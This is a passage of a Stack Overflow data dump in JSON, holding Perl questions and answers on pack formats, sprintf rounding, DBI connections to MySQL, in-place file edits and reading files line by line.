to make up for that."}, {"owner": {"reputation": 3, "user_id": 7975508, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4F7qvz7yoNE/AAAAAAAAAAI/AAAAAAAABrw/o0__ogDCOuA/photo.jpg?sz=128", "display_name": "jack low", "link": "https://stackoverflow.com/users/7975508/jack-low"}, "edited": false, "score": 0, "creation_date": 1495368104, "post_id": 44006626, "comment_id": 75213947, "body": "I tried to test the code in reference.Thanks to you, the problem has been solved. Thank you very much.  &quot;test url&quot;:<a href=\"http://plnkr.co/urgQPFBQ76VSJyuqJy5f\" rel=\"nofollow noreferrer\">plnkr.co/urgQPFBQ76VSJyuqJy5f</a>"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1494951328, "creation_date": 1494951328, "answer_id": 44006626, "question_id": 44005908, "link": "https://stackoverflow.com/questions/44005908/javascript-perl-pack/44006626#44006626", "title": "javascript Perl pack", "body": "<p><code>pack 'C'</code>, <code>pack 'N'</code> and <code>pack 'H*'</code> are used to create a sequence of bytes.</p>\n\n<pre><code>my $bytes = pack('C', $uint8);\n\n# Array of bytes\nvar bytes = [];\nbytes.push(uint8);\n\n# String of bytes\nvar bytes = \"\";\nbytes += String.fromCharCode(uint8);\n</code></pre>\n\n<p>&#x20;</p>\n\n<pre><code>my $bytes = pack('N', $uint32);\n\n# Array of bytes\nvar bytes = [];\nbytes.push((uint32 &gt;&gt; 24) &amp; 0xFF);\nbytes.push((uint32 &gt;&gt; 16) &amp; 0xFF);\nbytes.push((uint32 &gt;&gt;  8) &amp; 0xFF);\nbytes.push((uint32      ) &amp; 0xFF);\n\n# String of bytes\nvar bytes = \"\";\nbytes += String.fromCharCode((uint32 &gt;&gt; 24) &amp; 0xFF);\nbytes += String.fromCharCode((uint32 &gt;&gt; 16) &amp; 0xFF);\nbytes += String.fromCharCode((uint32 &gt;&gt;  8) &amp; 0xFF);\nbytes += String.fromCharCode((uint32      ) &amp; 0xFF);\n</code></pre>\n\n<p>&#x20;</p>\n\n<pre><code>my $bytes = pack('H*', $hex_str);\n\n# Array of bytes\nfunction hexToBytes(hex) {\n    var bytes = [];\n    for (var c = 0; c &lt; hex.length; c += 2)\n       bytes.push(parseInt(hex.substr(c, 2), 16));\n\n    return bytes;\n}\n\n# String of bytes\nfunction hexToBytes(hex) {\n    var bytes = \"\";\n    for (var c = 0; c &lt; hex.length; c += 2)\n       bytes += String.fromCharCode(parseInt(hex.substr(c, 2), 16));\n\n    return bytes;\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 7975508, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4F7qvz7yoNE/AAAAAAAAAAI/AAAAAAAABrw/o0__ogDCOuA/photo.jpg?sz=128", "display_name": "jack low", "link": "https://stackoverflow.com/users/7975508/jack-low"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 266, "favorite_count": 1, "closed_date": 1496188176, "accepted_answer_id": 44006626, "answer_count": 1, "score": -5, "last_activity_date": 1494951328, "creation_date": 1494949268, "question_id": 44005908, "link": "https://stackoverflow.com/questions/44005908/javascript-perl-pack", "closed_reason": "Needs more focus", "title": "javascript Perl pack", "body": "<p>First, I'll tell you\nI cannot speak English, but I want to try and get information of how to implement a Perl pack into Javascript to make a node.js module. </p>\n\n<p>To do that, I would like to get more information about the Perl pack. In particular, the information I  especially want to know \"C, H *, N\".</p>\n\n<p>Also, if I could get more information on jspack, that would be wonderful.</p>\n\n<p>Thank you in advance.</p>\n\n<p><a href=\"https://ja.stackoverflow.com/questions/34753/perl%E3%81%AEpack%E9%96%A2%E6%95%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6\">\u65e5\u672c\u8a9e(Japan)</a></p>\n"}, {"tags": ["python", "regex", "perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 4, "creation_date": 1494947552, "post_id": 44005264, "comment_id": 75038843, "body": "This is a job for <code>sprintf</code>, not regular expressions."}, {"owner": {"reputation": 4431, "user_id": 6272142, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/623cI.jpg?s=128&g=1", "display_name": "Mr. Xcoder", "link": "https://stackoverflow.com/users/6272142/mr-xcoder"}, "edited": false, "score": 0, "creation_date": 1494947566, "post_id": 44005264, "comment_id": 75038847, "body": "Why using a regex? It is a totally unreliable solution"}, {"owner": {"reputation": 4431, "user_id": 6272142, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/623cI.jpg?s=128&g=1", "display_name": "Mr. Xcoder", "link": "https://stackoverflow.com/users/6272142/mr-xcoder"}, "edited": false, "score": 1, "creation_date": 1494948206, "post_id": 44005264, "comment_id": 75039294, "body": "Is this a Perl or a Python question? It is tagged as both."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1494947969, "creation_date": 1494947969, "answer_id": 44005456, "question_id": 44005264, "link": "https://stackoverflow.com/questions/44005264/convert-floating-point-and-integer-literals-to-fixed-point-literals-using-regex/44005456#44005456", "title": "Convert floating point and integer literals to fixed point literals using regex", "body": "<pre><code>$_ = sprintf \"%.3f\", $_;\n</code></pre>\n\n<p>(A regular expression defines a set of strings. It doesn't perform changes. As such, I ignored the requirement to use do this using a regex pattern.)</p>\n"}], "owner": {"reputation": 25, "user_id": 5719753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/29f6d9f9c4eec292e380d67696c1bced?s=128&d=identicon&r=PG&f=1", "display_name": "Carbon Based Lifeform", "link": "https://stackoverflow.com/users/5719753/carbon-based-lifeform"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1494953427, "creation_date": 1494947458, "last_edit_date": 1494953427, "question_id": 44005264, "link": "https://stackoverflow.com/questions/44005264/convert-floating-point-and-integer-literals-to-fixed-point-literals-using-regex", "title": "Convert floating point and integer literals to fixed point literals using regex", "body": "\n\n<p>I have this text</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>123.56013414\n12\n14.5\n</code></pre>\n\n<p>Is it possible to convert it to</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>123.560\n12.000\n14.500\n</code></pre>\n\n<p>using regex?</p>\n"}, {"tags": ["mysql", "perl", "dbi"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 5, "creation_date": 1494947263, "post_id": 44005025, "comment_id": 75038639, "body": "What kind of output would you expect to see? You&#39;re only printing a header, which is invisible!"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1494947284, "post_id": 44005025, "comment_id": 75038657, "body": "Anything in the webserver log?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1495039467, "post_id": 44005025, "comment_id": 75087540, "body": "Please read <a href=\"http://stackoverflow.com/help/someone-answers\"><i>What should I do when someone answers my question?</i></a>"}], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 3, "last_activity_date": 1494997837, "last_edit_date": 1494997837, "creation_date": 1494948189, "answer_id": 44005540, "question_id": 44005025, "link": "https://stackoverflow.com/questions/44005025/connecting-to-a-mysql-database-using-dbi/44005540#44005540", "title": "Connecting to a MySQL database using DBI", "body": "<blockquote>\n  <p>but it doesn't show any output.</p>\n</blockquote>\n\n<p>Judging by the CGI header you're displaying, I assume that you're running this as a CGI program. In which case, it's no surprised that you're not seeing any output - you're not sending any output.</p>\n\n<p>If you ran it as a command line program (and it's often a good idea to get stuff working on the command line before leaping into CGI programming), then you would see the \"Content-Type\" header. Alternatively, you could add some output to your program and see if that appears in your browser. Something simple like:</p>\n\n<pre><code>print 'It works!';\n</code></pre>\n\n<p>I'd also like to add, that CGI looks rather outdated these days and there are far better (by which I mean easier and more powerful) ways to write web applications with Perl. You might like to read <a href=\"https://metacpan.org/pod/CGI::Alternatives\" rel=\"nofollow noreferrer\">CGI::Alternatives</a> to get an idea of what is available.</p>\n\n<p><strong>Update:</strong> </p>\n\n<p>I've just seen this question asked on Facebook (please don't cross-post without telling people) and I've noticed that your <code>$driver</code> variable is wrong. If you're connecting to MySQL, then <code>$driver</code> should be \"mysql\" (so that DBI loads \"DBD::mysql\"). </p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 3, "last_activity_date": 1494955459, "last_edit_date": 1494955459, "creation_date": 1494954658, "answer_id": 44007673, "question_id": 44005025, "link": "https://stackoverflow.com/questions/44005025/connecting-to-a-mysql-database-using-dbi/44007673#44007673", "title": "Connecting to a MySQL database using DBI", "body": "<p>A DSN for the MySQL driver looks like this</p>\n\n<pre><code>DBI:mysql:database=$database;host=$hostname;port=$port\n</code></pre>\n\n<p>where the <code>host</code> and <code>port</code> fields are optional. (The <code>database</code> is also optional, but you don't want to leave that out.) There are several more esoteric options too, but they're irrelevant here</p>\n\n<p>But you're supplying</p>\n\n<pre><code>DBI:localhost:database = data\n</code></pre>\n\n<p>Which doesn't even specify a MySQL connection, so I'm not surprised if it doesn't work! I don't know whether the spaces are legal, but I would leave them out to keep in line with the documentation.</p>\n\n<p>You should change that statement to</p>\n\n<pre><code>my $dsn = \"DBI:mysql:database=$database;host=$driver\"\n</code></pre>\n\n<p>You may remove <code>;host=$driver</code> if you wish (why have you called the host name \"driver\"?) as <code>localhost</code> is the default. A DSN that specifies just a database name and uses the default for all the other fields may be contracted to just</p>\n\n<pre><code>my $dsn = \"DBI:mysql:$database\"\n</code></pre>\n\n<p>It may be easier to just write <code>print</code> statements at first to generate some output. You will want to print a MIME content type header of <code>text/plain</code> instead of <code>text/html</code>. Try <code>print \"$DBI::errstr\\n\"</code> for now instead of <code>die</code>, as the latter writes to stderr which won't appear in your browser</p>\n"}, {"comments": [{"owner": {"reputation": 3, "user_id": 7540790, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-OJZhLbv6egA/AAAAAAAAAAI/AAAAAAAAAQM/pCvW-cm1qMo/photo.jpg?sz=128", "display_name": "Stefan Th&#252;ring", "link": "https://stackoverflow.com/users/7540790/stefan-th%c3%bcring"}, "reply_to_user": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1495200438, "post_id": 44041211, "comment_id": 75166633, "body": "Yes, that&#39;s true. I stopped using die in recent years. I prefer reacting to errors instead of just alerting them."}], "tags": [], "owner": {"reputation": 3, "user_id": 7540790, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-OJZhLbv6egA/AAAAAAAAAAI/AAAAAAAAAQM/pCvW-cm1qMo/photo.jpg?sz=128", "display_name": "Stefan Th&#252;ring", "link": "https://stackoverflow.com/users/7540790/stefan-th%c3%bcring"}, "is_accepted": false, "score": -1, "last_activity_date": 1495092280, "creation_date": 1495092280, "answer_id": 44041211, "question_id": 44005025, "link": "https://stackoverflow.com/questions/44005025/connecting-to-a-mysql-database-using-dbi/44041211#44041211", "title": "Connecting to a MySQL database using DBI", "body": "<p>you could add:</p>\n\n<pre><code>if ($dbh) {\n print 'connect ok';\n} else {\n print 'connect failed';\n}\n</code></pre>\n"}], "owner": {"reputation": 15, "user_id": 7737580, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/401984440180091/picture?type=large", "display_name": "NIrik Shan", "link": "https://stackoverflow.com/users/7737580/nirik-shan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 628, "favorite_count": 0, "accepted_answer_id": 44005540, "answer_count": 3, "score": -3, "last_activity_date": 1495092280, "creation_date": 1494946805, "last_edit_date": 1494957153, "question_id": 44005025, "link": "https://stackoverflow.com/questions/44005025/connecting-to-a-mysql-database-using-dbi", "title": "Connecting to a MySQL database using DBI", "body": "<p>I am trying to connect to a MySQL database.</p>\n\n<p>I found this script and I am trying to use it on my PC and web host, but it doesn't show any output.</p>\n\n<p>Please have a look at this code. I am running perl at xampp.</p>\n\n<pre><code>#!C:\\xampp\\perl\\bin\\perl.exe\n\nprint \"Content-type: text/html\\n\\n\";\n\nuse DBI;\nuse strict;\n\nmy $driver   = \"localhost\"; \nmy $database = \"data\";\nmy $dsn      = \"DBI:$driver:database = $database\";\nmy $userid   = \"root\";\nmy $password = \"\";\n\nmy $dbh = DBI-&gt;connect($dsn, $userid, $password ) or die $DBI::errstr;\n</code></pre>\n\n<p>I am using the same database with PHP.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1494937702, "post_id": 44001449, "comment_id": 75031171, "body": "You are calling perl in a perl file?"}, {"owner": {"reputation": 107, "user_id": 6444381, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/861505ce98bec1a301229277b6568b74?s=128&d=identicon&r=PG&f=1", "display_name": "Damon", "link": "https://stackoverflow.com/users/6444381/damon"}, "reply_to_user": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1494937764, "post_id": 44001449, "comment_id": 75031204, "body": "i thought that was the mistake, but i don&#39;t know how to solve it.."}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1494937896, "post_id": 44001449, "comment_id": 75031306, "body": "What you are trying to do here?"}, {"owner": {"reputation": 107, "user_id": 6444381, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/861505ce98bec1a301229277b6568b74?s=128&d=identicon&r=PG&f=1", "display_name": "Damon", "link": "https://stackoverflow.com/users/6444381/damon"}, "reply_to_user": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1494937999, "post_id": 44001449, "comment_id": 75031388, "body": "The file &#39;export&#39; is a big config file and i need to remove every xxx.test.ch entry in that file, if i run the command &quot;perl -pli -e &quot;s/$server_a//&quot; &#39;/Users/user/Downloads/exports&#39;;&quot; in Bash it works (obviously..) but how can i do that in perl..?"}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1494938251, "post_id": 44001449, "comment_id": 75031573, "body": "Why you Need it in perl can&#39;t you use it in bash?"}, {"owner": {"reputation": 107, "user_id": 6444381, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/861505ce98bec1a301229277b6568b74?s=128&d=identicon&r=PG&f=1", "display_name": "Damon", "link": "https://stackoverflow.com/users/6444381/damon"}, "reply_to_user": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1494938338, "post_id": 44001449, "comment_id": 75031644, "body": "@Jens it has to be perl, can&#39;t use bash at all."}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1494938459, "post_id": 44001449, "comment_id": 75031743, "body": "then you have to open the file Change the strings and write it back into an other file. If you have done it, you have to rename the out file."}], "answers": [{"comments": [{"owner": {"reputation": 107, "user_id": 6444381, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/861505ce98bec1a301229277b6568b74?s=128&d=identicon&r=PG&f=1", "display_name": "Damon", "link": "https://stackoverflow.com/users/6444381/damon"}, "edited": false, "score": 0, "creation_date": 1494941581, "post_id": 44001789, "comment_id": 75034272, "body": "before i try it out and ruin it, i&#39;ll try to understand yours. So basically every line, that doesn&#39;t contains xxx.test.ch will stay the same but every line that contains xxx.test.ch will be removed, correct?"}, {"owner": {"reputation": 107, "user_id": 6444381, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/861505ce98bec1a301229277b6568b74?s=128&d=identicon&r=PG&f=1", "display_name": "Damon", "link": "https://stackoverflow.com/users/6444381/damon"}, "edited": false, "score": 0, "creation_date": 1494941645, "post_id": 44001789, "comment_id": 75034318, "body": "what if it contains &quot;-sec=lala.test.ch:tutu.test.ch:xxx.test.ch:gege.test.ch&quot;?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 107, "user_id": 6444381, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/861505ce98bec1a301229277b6568b74?s=128&d=identicon&r=PG&f=1", "display_name": "Damon", "link": "https://stackoverflow.com/users/6444381/damon"}, "edited": false, "score": 0, "creation_date": 1494942092, "post_id": 44001789, "comment_id": 75034678, "body": "@Damon: Fixed by using substitution as in your original code."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 3, "last_activity_date": 1494942075, "last_edit_date": 1494942075, "creation_date": 1494938533, "answer_id": 44001789, "question_id": 44001449, "link": "https://stackoverflow.com/questions/44001449/cant-execute-command-in-perl-script/44001789#44001789", "title": "Can&#39;t execute command in Perl script", "body": "<pre><code>#! /usr/bin/perl\nuse warnings;\nuse strict;\n\n@ARGV = '/Users/user/Downloads/exports';\n$^I = '~';\n\nmy $server_a = quotemeta 'xxx.test.ch';\ns/$server_a//, print while &lt;&gt;;\n</code></pre>\n\n<p>The @ARGV array contains the arguments, it's iterated by the diamond operator. </p>\n\n<p><code>$^I</code> is equivalent to the <code>-i</code> option.</p>\n\n<p>You probably need <a href=\"http://p3rl.org/quotemeta\" rel=\"nofollow noreferrer\">quotemeta</a>, as you don't mean \"anything but newline\" by dots in the server name.</p>\n"}], "owner": {"reputation": 107, "user_id": 6444381, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/861505ce98bec1a301229277b6568b74?s=128&d=identicon&r=PG&f=1", "display_name": "Damon", "link": "https://stackoverflow.com/users/6444381/damon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 454, "favorite_count": 0, "accepted_answer_id": 44001789, "answer_count": 1, "score": -1, "last_activity_date": 1494942075, "creation_date": 1494937562, "question_id": 44001449, "link": "https://stackoverflow.com/questions/44001449/cant-execute-command-in-perl-script", "title": "Can&#39;t execute command in Perl script", "body": "<p>first of all, i'm totally new to Perl and i need to remove a string from a file.</p>\n\n<p>Code i have:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse warnings;\nuse strict;\n\nmy $server_a = 'xxx.test.ch';\n\nprint \"$server_a\\n\";\nperl -pli -e \"s/$server_a//\" '/Users/user/Downloads/exports';\n</code></pre>\n\n<p>When i execute this script i get this error:</p>\n\n<pre><code>syntax error at nfs_test.sh line 9, near \"pli -e \"\nExecution of nfs_test.sh aborted due to compilation errors.\n</code></pre>\n\n<p>i cant find whats wrong, i hope you can help me.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1494938759, "post_id": 44001137, "comment_id": 75031970, "body": "If you&#39;re asking a number of people to read and understand your code, then it&#39;s polite to make it as easy to read as possible. I&#39;ve done some light reformating to add some indentation and make your use of whitespace more uniform. Please do that yourself in future."}], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1494939188, "creation_date": 1494939188, "answer_id": 44002048, "question_id": 44001137, "link": "https://stackoverflow.com/questions/44001137/reading-file-line-by-line/44002048#44002048", "title": "reading file line by line", "body": "<p>When you read a filehandle to the end of the file, the next read from that filehandle will return <code>undef</code>. And it will continue to return <code>undef</code> no matter how many times you call it.</p>\n\n<p>You cannot iterate through the phrase file without using the <a href=\"https://perldoc.perl.org/functions/seek.html\" rel=\"nofollow noreferrer\">seek()</a> function to reset the file pointer to the start of the file.</p>\n\n<pre><code>seek $CorpusPhrases, 0, 0;\n</code></pre>\n\n<p>Alternatively, you might consider reading one (or both) of your files into memory so you don't need to keep reading the files.</p>\n"}, {"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 3, "creation_date": 1494948304, "post_id": 44005517, "comment_id": 75039366, "body": "You have a rather long-winded way of writing <code>my @process = &lt;$sentences&gt;;</code> :-)"}], "tags": [], "owner": {"reputation": 333, "user_id": 6168549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04203874c94da7b9bcd58f6096ae8375?s=128&d=identicon&r=PG&f=1", "display_name": "Carlos", "link": "https://stackoverflow.com/users/6168549/carlos"}, "is_accepted": false, "score": 0, "last_activity_date": 1494948337, "last_edit_date": 1494948337, "creation_date": 1494948128, "answer_id": 44005517, "question_id": 44001137, "link": "https://stackoverflow.com/questions/44001137/reading-file-line-by-line/44005517#44005517", "title": "reading file line by line", "body": "<p>Looking at your code; the processing will only be performed for the first\nword of the file because you iterate over the whole \"sentence\" file in the\nthe first line read from \"word\" file.</p>\n\n<p>Two solutions where mentioned already; using seek and loading into memory.</p>\n\n<p>I'm an advocate of loading the files into memory and process accordingly.</p>\n\n<pre><code>#test file is the file that contain my words\nopen( my $words, '&lt;:utf8', 'test' ) or die \"Unable to open for read: $!\";   \n\n#sentences fila that contain one sentence per line\nopen( my $sentences, '&lt;:utf8', 'sentences' ) or die \"Unable to open for read: $!\"; \nopen my $fh_resultat, \"&gt;:utf8\", 'result';\nmy $word;\n\n#i want to calculate the number of sentences from my $sentences that containe word from my file $words\n\n#load sentences into memory\nmy @process;\nwhile ( $line = &lt;$sentences&gt; ) {\n    push (@process, $line );\n}\nclose(sentences);\n\nwhile( defined( $word = &lt;$words&gt; ) ) {\n    chomp $word ;\n    $word =~ s/^\\s*|\\s*$//g;\n    my $nb = 0;\n    my $idf;\n    my $ph;\n\n    for $ph (@process) {\n        my @tab = split(/ /, $ph);\n        chomp @tab ;\n        foreach my $val(@tab) {\n            if($word eq $val){\n                $nb = $nb + 1;\n                last;\n            }\n        }\n    }\n    print $fh_resultat \"$word:$nb\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 7364753, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/9e35cb4543e9ca0b2f6915c42941575c?s=128&d=identicon&r=PG&f=1", "display_name": "rim", "link": "https://stackoverflow.com/users/7364753/rim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 191, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1494948337, "creation_date": 1494936775, "last_edit_date": 1494938958, "question_id": 44001137, "link": "https://stackoverflow.com/questions/44001137/reading-file-line-by-line", "title": "reading file line by line", "body": "<p>I have two files which I want to read line by line (the first contains a word per line and the second a sentence per line). </p>\n\n<p>The goal is to calculate the <strong>number of the sentences</strong> from <code>file 2</code> containing a word being in <code>file 1</code>.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>open( my $words, '&lt;:utf8', 'test' ) or die \"Unable to open for read: $!\"; `#test file is the file that contain my words`\nopen( my $sentences, '&lt;:utf8', 'sentences' ) or die \"Unable to open for read: $!\"; `#sentences fila that contain one sentence per line`\nopen my $fh_resultat, \"&gt;:utf8\", 'result';\nmy $word;\n#i want to calculate the number of sentences from my $sentences that containe word from my file $words\nwhile( defined( $word = &lt;$words&gt; ) ) {\n    chomp $word ;\n    $word =~ s/^\\s*|\\s*$//g;\n    my $nb = 0;\n    my $idf;\n    my $ph;\n    while (defined ( $ph = &lt;$sentences&gt; ) ){\n        my @tab = split(/ /, $ph);\n        chomp @tab ;\n        foreach my $val(@tab) {\n            if($word eq $val){\n                $nb = $nb + 1;\n                last;\n            }\n        }\n    }\n    print $fh_resultat \"$word:$nb\\n\";\n}\n</code></pre>\n\n<p>but the processing is only performed for the first word of the first file!</p>\n"}, {"tags": ["perl", "hash"], "comments": [{"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1494932561, "post_id": 43999501, "comment_id": 75027516, "body": "Could you please explain how this is duplicate while comparing the with the already asked question. This is in hash variable and that is array variable. I don&#39;t know how to get the output from arrays to hashes."}, {"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1494932728, "post_id": 43999501, "comment_id": 75027633, "body": "Hint: put <code>keys %bibIdstr</code> into an array and sort it. Also you might want to check <a href=\"http://stackoverflow.com/questions/19544253/sorting-alphanumeric-hash-keys-in-perl\" title=\"sorting alphanumeric hash keys in perl\">stackoverflow.com/questions/19544253/&hellip;</a>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, 